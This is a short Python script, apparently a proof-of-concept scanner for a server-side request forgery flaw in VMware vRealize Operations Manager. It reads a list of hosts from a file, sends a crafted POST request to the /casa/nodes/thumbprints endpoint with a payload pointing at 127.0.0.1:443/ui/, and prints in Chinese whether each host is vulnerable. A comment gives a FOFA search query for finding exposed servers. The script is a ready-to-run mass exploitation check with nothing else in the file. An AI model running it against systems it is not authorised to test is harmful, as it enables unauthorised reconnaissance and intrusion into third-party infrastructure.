# -*- coding: UTF-8 -*-
# fofa app="vmware-vRealize-Operations-Manager"
import requests
from urllib.parse import urlparse
import warnings
warnings.filterwarnings('ignore')

headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8",
    }

datas = f'["127.0.0.1:443/ui/"]'

###
###url检测函数
###需根据情况自行构造，如检测漏洞页面是否存在等操作
###check_url(url)
###


def check_url(url):
    print ("check_url: "+url)
    try:
        req=requests.post(url=url,headers=headers,data=datas,verify=False,timeout=10)
        if req.status_code == 200 and "vRealize Operations Manager" in req.text:
            print("[success]存在ssrf漏洞")
        else:
            print("[error]不存在ssrf漏洞")
    except Exception as e:
        print("[error]不存在ssrf漏洞")
        pass

###
###url处理函数
###从ip:port、http://ip:port、https://domain:port/path/xx.html等不同格式转化为 协议+ip/domain+port格式
###read_url
###


def read_url():
    f = open("urls.txt", 'r')
    for line in f.readlines():
        target = line.strip()
        #print(target)
        if "http" not in line:
            target="http://"+target
        target=urlparse(target.strip())
        #print(target)
        url = target.scheme+"://"+target.netloc+"/casa/nodes/thumbprints"
        #print(url)
        #拼接成需要的格式
        
        check_url(url)


def main():
    read_url()

main()
